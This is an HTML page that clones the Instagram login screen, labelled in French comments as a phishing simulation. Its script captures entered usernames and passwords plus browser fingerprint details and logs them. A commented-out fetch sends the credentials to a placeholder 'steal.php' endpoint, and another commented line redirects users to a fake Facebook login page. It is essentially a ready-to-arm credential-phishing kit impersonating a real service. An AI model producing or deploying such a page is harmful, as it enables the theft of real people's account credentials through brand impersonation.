<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Photos and Videos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }

        .container {
            max-width: 350px;
            width: 100%;
        }

        /* ===== CARTE PRINCIPALE ===== */
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        .login-card .logo {
            margin-bottom: 30px;
        }

        .login-card .logo svg {
            width: 175px;
            height: auto;
        }

        /* ===== FORMULAIRE ===== */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .login-form input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            transition: border-color 0.1s;
        }

        .login-form input:focus {
            border-color: #a8a8a8;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }

        .login-form button {
            width: 100%;
            padding: 7px 16px;
            margin-top: 8px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
            opacity: 0.7;
        }

        .login-form button.active {
            opacity: 1;
        }

        .login-form button:hover {
            background-color: #1877f2;
        }

        /* ===== SÉPARATEUR ===== */
        .separator {
            display: flex;
            align-items: center;
            margin: 14px 0 18px;
        }

        .separator .line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .separator .or {
            color: #737373;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }

        /* ===== LOGIN FACEBOOK ===== */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: none;
            border: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 12px;
            width: 100%;
        }

        .fb-login svg {
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            display: block;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* ===== CARTE INSCRIPTION ===== */
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        /* ===== TÉLÉCHARGEMENT ===== */
        .get-app {
            text-align: center;
            margin-top: 10px;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .get-app .stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .get-app .stores img {
            height: 40px;
        }

        /* ===== FOOTER ===== */
        footer {
            margin-top: 40px;
            max-width: 800px;
            width: 100%;
            text-align: center;
        }

        footer .links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            font-size: 12px;
            margin-bottom: 12px;
        }

        footer .links a {
            color: #8e8e8e;
            text-decoration: none;
        }

        footer .links a:hover {
            text-decoration: underline;
        }

        footer .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        /* ===== SIMULATION NOTIFICATION ===== */
        #notification {
            display: none;
            margin-top: 10px;
            padding: 12px;
            border-radius: 6px;
            font-size: 13px;
        }

        #notification.success {
            display: block;
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }

        #notification.error {
            display: block;
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 450px) {
            body {
                background: #fff;
                padding: 0;
            }
            .login-card {
                border: none;
                padding: 40px 20px 20px;
            }
            .signup-card {
                border: none;
            }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ===== CARTE LOGIN ===== -->
        <div class="login-card">
            <div class="logo">
                <!-- SVG Logo Instagram officiel -->
                <svg viewBox="0 0 175 50" xmlns="http://www.w3.org/2000/svg">
                    <text x="0" y="40" font-family="Arial, sans-serif" font-weight="700" font-size="38" fill="#262626">Instagram</text>
                </svg>
            </div>

            <form class="login-form" id="loginForm" autocomplete="off">
                <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="submit" id="loginBtn" disabled>Log in</button>
            </form>

            <div class="separator">
                <span class="line"></span>
                <span class="or">OR</span>
                <span class="line"></span>
            </div>

            <button class="fb-login" id="fbLogin">
                <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="8" cy="8" r="8" fill="#1877f2"/>
                    <path d="M10.1 8.2l.3-2.3H8.2V4.4c0-.6.3-1.2 1.2-1.2h1V1.2S9.6 1 8.4 1c-1.7 0-2.8 1-2.8 3v1.9H3.7v2.3h1.9v5.5h2.6V8.2z" fill="#fff"/>
                </svg>
                Log in with Facebook
            </button>

            <a href="#" class="forgot-password">Forgot password?</a>

            <!-- Notification placeholder -->
            <div id="notification"></div>
        </div>

        <!-- ===== CARTE INSCRIPTION ===== -->
        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <!-- ===== TÉLÉCHARGEMENT ===== -->
        <div class="get-app">
            <p>Get the app.</p>
            <div class="stores">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23212121'/%3E%3Ctext x='18' y='26' font-family='Arial' font-size='13' fill='white'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23212121'/%3E%3Ctext x='12' y='26' font-family='Arial' font-size='13' fill='white'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
            </div>
        </div>

        <!-- ===== FOOTER ===== -->
        <footer>
            <div class="links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="copyright">
                © 2026 Instagram from Meta
            </div>
        </footer>

    </div>

    <script>
        // =============================================
        // SIMULATION LOGIN — ACTIVATION BOUTON
        // =============================================
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const notification = document.getElementById('notification');

        function checkFields() {
            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
                loginBtn.disabled = false;
                loginBtn.classList.add('active');
            } else {
                loginBtn.disabled = true;
                loginBtn.classList.remove('active');
            }
        }

        usernameInput.addEventListener('input', checkFields);
        passwordInput.addEventListener('input', checkFields);

        // =============================================
        // FORM SUBMISSION — CAPTURE DES DONNÉES
        // =============================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value;

            // AFFICHER UN MESSAGE DE SIMULATION
            notification.className = 'success';
            notification.textContent = '✅ Credentials captured (SIMULATION) — See console for details.';

            // LOG EN CONSOLE (caché de l'utilisateur normal)
            console.log('%c[PHISHING SIMULATION]', 'color: red; font-weight: bold; font-size: 14px;');
            console.table({
                'Username/Email': username,
                'Password': password,
                'Timestamp': new Date().toISOString(),
                'User-Agent': navigator.userAgent,
                'Screen': `${window.screen.width}x${window.screen.height}`,
                'TimeZone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'Language': navigator.language,
                'Platform': navigator.platform
            });

            // SIMULATION : envoi vers un endpoint (commenté)
            // fetch('https://ton-serveur.com/steal.php', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({ username, password, userAgent: navigator.userAgent })
            // });

            // Réinitialisation simulation (optionnelle)
            // usernameInput.value = '';
            // passwordInput.value = '';
            // checkFields();
        });

        // =============================================
        // LOGIN FACEBOOK — SIMULATION
        // =============================================
        document.getElementById('fbLogin').addEventListener('click', function() {
            notification.className = 'success';
            notification.textContent = '✅ Facebook OAuth redirect (SIMULATION)';

            console.log('%c[FB PHISHING SIMULATION]', 'color: blue; font-weight: bold;');
            console.log('Redirect to fake Facebook OAuth page...');
            // window.location.href = 'https://ton-serveur.com/fake-fb-login.php';
        });
    </script>

</body>
</html>
